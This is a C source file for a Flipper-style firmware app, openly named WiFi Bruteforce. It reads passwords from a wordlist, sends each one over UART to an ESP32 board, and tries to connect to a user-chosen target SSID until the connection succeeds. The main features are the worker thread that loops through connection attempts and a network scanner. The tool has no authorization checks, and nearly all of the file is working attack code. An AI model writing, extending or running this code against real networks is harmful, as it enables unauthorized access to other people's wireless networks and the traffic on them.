/*
 * WiFi Bruteforce - Standalone App for Flipped Firmware
 *
 * Brute-forces WiFi passwords using a wordlist file via the ESP32 UART bridge.
 * Requires ESP32 WiFi dev board connected via GPIO UART.
 *
 * Wordlists go in /ext/wordlists/ as plain text files (one password per line).
 */

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/text_box.h>
#include <gui/modules/text_input.h>
#include <gui/modules/loading.h>
#include <gui/modules/dialog_ex.h>
#include <storage/storage.h>
#include <dialogs/dialogs.h>
#include <notification/notification_messages.h>
#include <furi_hal_serial.h>

#define UART_CH FuriHalSerialIdUsart
#define UART_BAUD 115200
#define RX_BUF_SIZE 512
#define OUTPUT_BUF_SIZE 4000
#define SSID_MAX_LEN 33
#define WORDLIST_DIR "/ext/wordlists"

typedef enum {
    ViewMenu,
    ViewOutput,
    ViewSsidInput,
    ViewLoading,
    ViewDialog,
} AppView;

typedef enum {
    BfStateIdle,
    BfStateRunning,
    BfStatePaused,
    BfStateFound,
    BfStateDone,
} BfState;

typedef struct {
    FuriHalSerialHandle* serial;
    FuriStreamBuffer* rx_stream;
    bool detected;
} WifiModule;

typedef struct {
    ViewDispatcher* view_dispatcher;
    Submenu* submenu;
    TextBox* text_box;
    TextInput* text_input;
    Loading* loading;
    DialogEx* dialog;
    Gui* gui;
    Storage* storage;
    NotificationApp* notification;
    DialogsApp* dialogs;

    WifiModule wifi;

    char ssid[SSID_MAX_LEN];
    FuriString* wordlist_path;
    char output_buf[OUTPUT_BUF_SIZE];
    size_t output_len;

    BfState bf_state;
    uint32_t total_passwords;
    uint32_t tried_passwords;
    char found_password[128];
    FuriThread* bf_thread;
    bool stop_requested;
} BruteforceApp;

/* ── UART helpers ── */

static void uart_rx_callback(
    FuriHalSerialHandle* handle,
    FuriHalSerialRxEvent event,
    void* context) {
    UNUSED(handle);
    BruteforceApp* app = context;
    if(event == FuriHalSerialRxEventData) {
        uint8_t byte = furi_hal_serial_async_rx(app->wifi.serial);
        furi_stream_buffer_send(app->wifi.rx_stream, &byte, 1, 0);
    }
}

static void wifi_init(BruteforceApp* app) {
    app->wifi.rx_stream = furi_stream_buffer_alloc(RX_BUF_SIZE, 1);
    app->wifi.serial = furi_hal_serial_control_acquire(UART_CH);
    furi_hal_serial_init(app->wifi.serial, UART_BAUD);
    furi_hal_serial_async_rx_start(app->wifi.serial, uart_rx_callback, app, false);
    app->wifi.detected = false;
}

static void wifi_deinit(BruteforceApp* app) {
    furi_hal_serial_async_rx_stop(app->wifi.serial);
    furi_hal_serial_deinit(app->wifi.serial);
    furi_hal_serial_control_release(app->wifi.serial);
    furi_stream_buffer_free(app->wifi.rx_stream);
}

static void wifi_send(BruteforceApp* app, const char* cmd) {
    furi_hal_serial_tx(app->wifi.serial, (const uint8_t*)cmd, strlen(cmd));
    furi_hal_serial_tx(app->wifi.serial, (const uint8_t*)"\r\n", 2);
}

static bool wifi_recv_line(BruteforceApp* app, char* buf, size_t buf_size, uint32_t timeout_ms) {
    size_t pos = 0;
    uint32_t start = furi_get_tick();
    while(furi_get_tick() - start < timeout_ms) {
        uint8_t byte;
        if(furi_stream_buffer_receive(app->wifi.rx_stream, &byte, 1, 10) == 1) {
            if(byte == '\n') {
                if(pos > 0 && buf[pos - 1] == '\r') pos--;
                buf[pos] = '\0';
                return true;
            }
            if(pos < buf_size - 1) {
                buf[pos++] = (char)byte;
            }
        }
    }
    buf[pos] = '\0';
    return pos > 0;
}

static bool wifi_detect(BruteforceApp* app) {
    /* Flush any pending data */
    uint8_t tmp;
    while(furi_stream_buffer_receive(app->wifi.rx_stream, &tmp, 1, 0) == 1) {}

    wifi_send(app, "AT");
    char resp[32];
    if(wifi_recv_line(app, resp, sizeof(resp), 500)) {
        if(strcmp(resp, "OK") == 0) {
            app->wifi.detected = true;
            return true;
        }
    }
    app->wifi.detected = false;
    return false;
}

/* ── Output helpers ── */

static void output_clear(BruteforceApp* app) {
    app->output_buf[0] = '\0';
    app->output_len = 0;
}

static void output_append(BruteforceApp* app, const char* text) {
    size_t tlen = strlen(text);
    if(app->output_len + tlen >= OUTPUT_BUF_SIZE - 1) {
        /* Truncate from the beginning */
        size_t keep = OUTPUT_BUF_SIZE / 2;
        size_t start = app->output_len - keep;
        memmove(app->output_buf, app->output_buf + start, keep);
        app->output_len = keep;
        app->output_buf[app->output_len] = '\0';
    }
    memcpy(app->output_buf + app->output_len, text, tlen);
    app->output_len += tlen;
    app->output_buf[app->output_len] = '\0';
}

static void output_refresh(BruteforceApp* app) {
    text_box_set_text(app->text_box, app->output_buf);
    text_box_set_focus(app->text_box, TextBoxFocusEnd);
}

/* ── Count lines in wordlist ── */

static uint32_t count_lines(Storage* storage, const char* path) {
    File* f = storage_file_alloc(storage);
    uint32_t count = 0;
    if(storage_file_open(f, path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buf[256];
        uint16_t read;
        while((read = storage_file_read(f, buf, sizeof(buf))) > 0) {
            for(uint16_t i = 0; i < read; i++) {
                if(buf[i] == '\n') count++;
            }
        }
    }
    storage_file_close(f);
    storage_file_free(f);
    return count;
}

/* ── Bruteforce thread ── */

static int32_t bruteforce_worker(void* context) {
    BruteforceApp* app = context;

    /* Set SSID */
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "WIFI_SSID %s", app->ssid);
    wifi_send(app, cmd);
    char resp[128];
    wifi_recv_line(app, resp, sizeof(resp), 1000);

    File* f = storage_file_alloc(app->storage);
    if(!storage_file_open(
           f, furi_string_get_cstr(app->wordlist_path), FSAM_READ, FSOM_OPEN_EXISTING)) {
        storage_file_free(f);
        app->bf_state = BfStateDone;
        return 0;
    }

    char line_buf[256];
    size_t line_pos = 0;
    char read_buf[256];
    uint16_t bytes_read;

    while(!app->stop_requested &&
          (bytes_read = storage_file_read(f, read_buf, sizeof(read_buf))) > 0) {
        for(uint16_t i = 0; i < bytes_read && !app->stop_requested; i++) {
            if(read_buf[i] == '\n' || read_buf[i] == '\r') {
                if(line_pos == 0) continue;
                line_buf[line_pos] = '\0';
                line_pos = 0;

                /* While paused, just wait */
                while(app->bf_state == BfStatePaused && !app->stop_requested) {
                    furi_delay_ms(100);
                }
                if(app->stop_requested) break;

                app->tried_passwords++;

                /* Try this password */
                snprintf(cmd, sizeof(cmd), "WIFI_PASS %s", line_buf);
                wifi_send(app, cmd);
                wifi_recv_line(app, resp, sizeof(resp), 1000);

                wifi_send(app, "WIFI_CONNECT");
                if(wifi_recv_line(app, resp, sizeof(resp), 8000)) {
                    if(strcmp(resp, "CONNECTED") == 0) {
                        /* Found it! */
                        strncpy(app->found_password, line_buf, sizeof(app->found_password) - 1);
                        app->bf_state = BfStateFound;
                        storage_file_close(f);
                        storage_file_free(f);
                        return 0;
                    }
                }

                /* Update output every 5 attempts */
                if(app->tried_passwords % 5 == 0) {
                    char status[128];
                    snprintf(
                        status,
                        sizeof(status),
                        "Trying: %s\n[%lu/%lu]\n",
                        line_buf,
                        (unsigned long)app->tried_passwords,
                        (unsigned long)app->total_passwords);
                    output_clear(app);
                    output_append(app, "WiFi Bruteforce Running\n");
                    output_append(app, "SSID: ");
                    output_append(app, app->ssid);
                    output_append(app, "\n\n");
                    output_append(app, status);
                    output_refresh(app);
                }
            } else {
                if(line_pos < sizeof(line_buf) - 1) {
                    line_buf[line_pos++] = read_buf[i];
                }
            }
        }
    }

    storage_file_close(f);
    storage_file_free(f);

    if(!app->stop_requested) {
        app->bf_state = BfStateDone;
    }
    return 0;
}

/* ── Navigation callbacks ── */

static void menu_callback(void* context, uint32_t index);

static uint32_t nav_exit(void* context) {
    UNUSED(context);
    return VIEW_NONE;
}

static uint32_t nav_menu(void* context) {
    UNUSED(context);
    return ViewMenu;
}

/* ── SSID input done ── */

static void ssid_input_done(void* context) {
    BruteforceApp* app = context;

    /* Pick wordlist file */
    DialogsFileBrowserOptions browser_opts;
    dialog_file_browser_set_basic_options(&browser_opts, ".txt", NULL);
    browser_opts.base_path = WORDLIST_DIR;
    browser_opts.hide_ext = false;

    FuriString* selected = furi_string_alloc_set_str(WORDLIST_DIR);
    bool picked = dialog_file_browser_show(app->dialogs, selected, selected, &browser_opts);

    if(!picked) {
        furi_string_free(selected);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
        return;
    }

    if(app->wordlist_path) furi_string_free(app->wordlist_path);
    app->wordlist_path = selected;

    /* Count passwords */
    app->total_passwords = count_lines(app->storage, furi_string_get_cstr(app->wordlist_path));
    if(app->total_passwords == 0) app->total_passwords = 1;
    app->tried_passwords = 0;
    app->stop_requested = false;
    app->found_password[0] = '\0';
    app->bf_state = BfStateRunning;

    output_clear(app);
    output_append(app, "WiFi Bruteforce Started\n");
    output_append(app, "SSID: ");
    output_append(app, app->ssid);
    output_append(app, "\nWordlist: ");
    output_append(app, furi_string_get_cstr(app->wordlist_path));
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "\nPasswords: %lu\n\n", (unsigned long)app->total_passwords);
    output_append(app, tmp);
    output_refresh(app);

    view_dispatcher_switch_to_view(app->view_dispatcher, ViewOutput);

    /* Launch worker thread */
    app->bf_thread = furi_thread_alloc_ex("bf_worker", 4096, bruteforce_worker, app);
    furi_thread_start(app->bf_thread);
}

/* ── Menu items ── */

typedef enum {
    MenuStartBruteforce,
    MenuScanNetworks,
} MenuItem;

static void menu_callback(void* context, uint32_t index) {
    BruteforceApp* app = context;

    if(index == MenuScanNetworks) {
        if(!app->wifi.detected) {
            output_clear(app);
            output_append(app, "No WiFi module detected!\nConnect ESP32 via UART.\n");
            output_refresh(app);
            view_dispatcher_switch_to_view(app->view_dispatcher, ViewOutput);
            return;
        }

        output_clear(app);
        output_append(app, "Scanning WiFi networks...\n\n");
        output_refresh(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewOutput);

        wifi_send(app, "WIFI_SCAN");
        char line[256];
        while(wifi_recv_line(app, line, sizeof(line), 10000)) {
            if(strcmp(line, "DONE") == 0) break;
            output_append(app, line);
            output_append(app, "\n");
            output_refresh(app);
        }
        output_append(app, "\nScan complete.\n");
        output_refresh(app);
        return;
    }

    if(index == MenuStartBruteforce) {
        if(!app->wifi.detected) {
            output_clear(app);
            output_append(app, "No WiFi module detected!\nConnect ESP32 via UART.\n");
            output_refresh(app);
            view_dispatcher_switch_to_view(app->view_dispatcher, ViewOutput);
            return;
        }

        /* Get SSID via text input */
        text_input_reset(app->text_input);
        text_input_set_header_text(app->text_input, "Target SSID:");
        text_input_set_result_callback(
            app->text_input, ssid_input_done, app, app->ssid, SSID_MAX_LEN, true);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewSsidInput);
        return;
    }
}

/* ── App lifecycle ── */

static BruteforceApp* app_alloc(void) {
    BruteforceApp* app = malloc(sizeof(BruteforceApp));
    memset(app, 0, sizeof(BruteforceApp));

    app->gui = furi_record_open(RECORD_GUI);
    app->storage = furi_record_open(RECORD_STORAGE);
    app->notification = furi_record_open(RECORD_NOTIFICATION);
    app->dialogs = furi_record_open(RECORD_DIALOGS);

    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    /* Submenu */
    app->submenu = submenu_alloc();
    view_set_previous_callback(submenu_get_view(app->submenu), nav_exit);
    view_dispatcher_add_view(app->view_dispatcher, ViewMenu, submenu_get_view(app->submenu));

    /* TextBox */
    app->text_box = text_box_alloc();
    text_box_set_font(app->text_box, TextBoxFontText);
    view_set_previous_callback(text_box_get_view(app->text_box), nav_menu);
    view_dispatcher_add_view(app->view_dispatcher, ViewOutput, text_box_get_view(app->text_box));

    /* TextInput */
    app->text_input = text_input_alloc();
    view_set_previous_callback(text_input_get_view(app->text_input), nav_menu);
    view_dispatcher_add_view(
        app->view_dispatcher, ViewSsidInput, text_input_get_view(app->text_input));

    /* Loading */
    app->loading = loading_alloc();
    view_dispatcher_add_view(app->view_dispatcher, ViewLoading, loading_get_view(app->loading));

    app->wordlist_path = furi_string_alloc();
    app->bf_state = BfStateIdle;

    /* Ensure wordlists dir exists */
    storage_common_mkdir(app->storage, WORDLIST_DIR);

    return app;
}

static void app_free(BruteforceApp* app) {
    if(app->bf_thread) {
        app->stop_requested = true;
        furi_thread_join(app->bf_thread);
        furi_thread_free(app->bf_thread);
    }

    view_dispatcher_remove_view(app->view_dispatcher, ViewMenu);
    view_dispatcher_remove_view(app->view_dispatcher, ViewOutput);
    view_dispatcher_remove_view(app->view_dispatcher, ViewSsidInput);
    view_dispatcher_remove_view(app->view_dispatcher, ViewLoading);

    submenu_free(app->submenu);
    text_box_free(app->text_box);
    text_input_free(app->text_input);
    loading_free(app->loading);

    if(app->wordlist_path) furi_string_free(app->wordlist_path);

    wifi_deinit(app);

    view_dispatcher_free(app->view_dispatcher);

    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_STORAGE);
    furi_record_close(RECORD_NOTIFICATION);
    furi_record_close(RECORD_DIALOGS);

    free(app);
}

int32_t wifi_bruteforce_app(void* p) {
    UNUSED(p);
    BruteforceApp* app = app_alloc();
    wifi_init(app);

    /* Detect module */
    wifi_detect(app);

    /* Build menu */
    submenu_reset(app->submenu);
    if(app->wifi.detected) {
        submenu_add_item(app->submenu, "Start Bruteforce", MenuStartBruteforce, menu_callback, app);
        submenu_add_item(app->submenu, "Scan Networks", MenuScanNetworks, menu_callback, app);
    } else {
        submenu_add_item(
            app->submenu, "[No WiFi Module]", MenuStartBruteforce, menu_callback, app);
        submenu_add_item(app->submenu, "Scan Networks", MenuScanNetworks, menu_callback, app);
    }

    view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
    view_dispatcher_run(app->view_dispatcher);

    app_free(app);
    return 0;
}
